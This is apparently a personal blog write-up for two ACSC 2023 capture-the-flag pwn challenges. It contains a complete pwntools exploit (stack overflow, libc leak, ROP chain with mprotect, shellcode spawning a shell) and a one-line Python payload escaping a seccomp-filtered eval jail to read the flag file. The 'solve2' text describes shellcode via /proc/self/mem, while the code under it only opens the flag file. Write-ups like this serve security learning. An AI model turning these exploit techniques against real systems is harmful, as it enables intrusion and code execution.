---
title: 「PWN」【ACSC 2023】Writeup WP 复现
authors: [nova]
tags: ['CTF', 'Pwn', 'writeup', 'wp']
categories: ['CTF']
---

This is an individual competition, but I have already forgot things for Web or Rev, let along Crypto. Meanwhile, we can not solve the hard challenges, so uh-hum, let's just say I'm not participate for the sake of the ranks LOL

<!--truncate-->

## Vaccine

The program uses a `scanf` to receive our input, therefore we have no length limit, and we can just modify *s* to be the same as *s2*.

![image-20230227192106762](https://cdn.novanoir.moe/img/image-20230227192106762.png)

Then, we'll be able to leak the libc_address and ret2libc by simply doing a stack overflow and changing the return address.

At first, I used a wrong libc version and there's no one_gadgets available, so I used the `mprotect` and shellcode to get the shell, which makes all things complicated.

exp:

```python
from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./vaccine'])
sh = remote('vaccine-2.chal.ctf.acsc.asia', 1337)
elf = ELF('./vaccine')
# libc = ELF('./libc6-i386_2.31-9_amd64.so')  # wrong libc lol
libc = ELF('/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6')

pop_rdi_ret = 0x401443
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

# gdb.attach(sh, 'b *0x00000000004013D7')
# pause()
payload = b'AAAA' + b'\x00'*108 + b'AAAA\x00'
payload = payload.ljust(0x108, b'\x00')
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(0x401236)
sh.sendlineafter(b'Give me vaccine: ', payload)
sh.recvuntil(b'castle\n')

libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x84420
mprotect = libc_base + libc.sym['mprotect']
read = libc_base + libc.sym['read']
pop_rsi_ret = libc_base + 0x02601f
pop_rdx_r12_ret = libc_base + 0x119211

print(hex(libc_base))
payload = b'AAAA' + b'\x00'*108 + b'AAAA\x00'
payload = payload.ljust(0x108, b'\x00')
payload += p64(pop_rdi_ret) + p64(elf.bss() & (~0xfff)) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_r12_ret) + p64(7)*2 + p64(mprotect)
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(elf.bss() + 0x50) + p64(pop_rdx_r12_ret) + p64(0x1000)*2 + p64(read) + p64(elf.bss() + 0x50) + p64(0x401236)
sh.sendlineafter(b'Give me vaccine: ', payload)

sh.sendline(asm(shellcraft.sh()))

sh.interactive()
```



## Evalbox

This is a really interesting challenge.

```python
#!/usr/bin/env python3
import seccomp

if __name__ == '__main__':
    f = seccomp.SyscallFilter(defaction=seccomp.ALLOW)
    f.add_rule(seccomp.KILL, 'close')
    f.load()
    eval(input("code: "))
```

It will `eval` anything we input, but it also prohibit all functions calling for `close`

In `Dockerfile`, we know that we should first get the filename of the flag.

At first I though it might be some differences between `seccomp.so` and [seccomp.pyx](https://github.com/seccomp/libseccomp/blob/main/src/python/seccomp.pyx). So I tried to compile this `.pyx` file and try using bindiff between this two files, but I failed :(



But there's actually many ways to bypass this jail.

### solve 1

This exp is in a pure python way.

we can use `os.scandir(os.open(".", 0))` to get all files in `.` directory, and we can use `print(os.open(filename, 'r').read())` to get the content of the file.

let's just shorten it with only one line.

```python
print(os:=__import__('os'), d:=os.scandir(os.open(".", 0)), f:=open(next(filter(lambda x: x.name.startswith("flag"), d))), f.read(), sep='\n\n')
```



### solve2

we can open `/proc/self/mem` and write shellcode on `.text` segment.

```
print(os:=__import__('os'), f:=open('flag-31540753807ba7099ea27997ca43e280.txt', 'r'), f.read())
```

